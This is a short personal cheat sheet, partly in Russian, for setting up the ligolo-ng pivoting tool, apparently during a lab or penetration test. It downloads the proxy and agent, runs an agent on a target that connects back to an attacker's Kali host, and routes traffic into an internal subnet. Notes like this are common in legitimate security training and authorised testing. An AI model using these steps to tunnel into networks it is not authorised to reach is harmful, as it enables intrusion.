---
id: "zjjvrc6zmms37gyef"
title: "ligolo-ng"
tags: []
isFavorite: false
order: 10
createdAt: "2026-07-27T12:31:02.439Z"
updatedAt: "2026-07-27T12:32:08.744Z"
---
```bash
https://github.com/nicocha30/ligolo-ng

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_agent_0.9_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_proxy_0.9_linux_amd64.tar.gz

tar -xzf ligolo-ng_proxy_0.9_linux_amd64.tar.gz

# 1. Запуск
sudo ./proxy -selfcert

получаем 
ligolo-ng » certificate_fingerprint

# 2. Создать интерфейс (сразу после старта)
interface_create --name ligolo

## on target
./agent -connect 10.10.14.239:11601 -accept-fingerprint B9569EF2305A681614CE69D9516539D4B562CEA18DB85D060CA5D210D289DEE1
or 
./agent -connect <IP_твоей_Kali>:11601 -ignore-cert

# 3. Дождаться Agent joined → выбрать сессию
session

# 4. Запустить туннель
tunnel_start --tun ligolo

-Смотрим интерфейс для добавления командой:
ifconfig 

# 5. Добавить маршрут
interface_add_route --name ligolo --route 172.16.5.0/23
```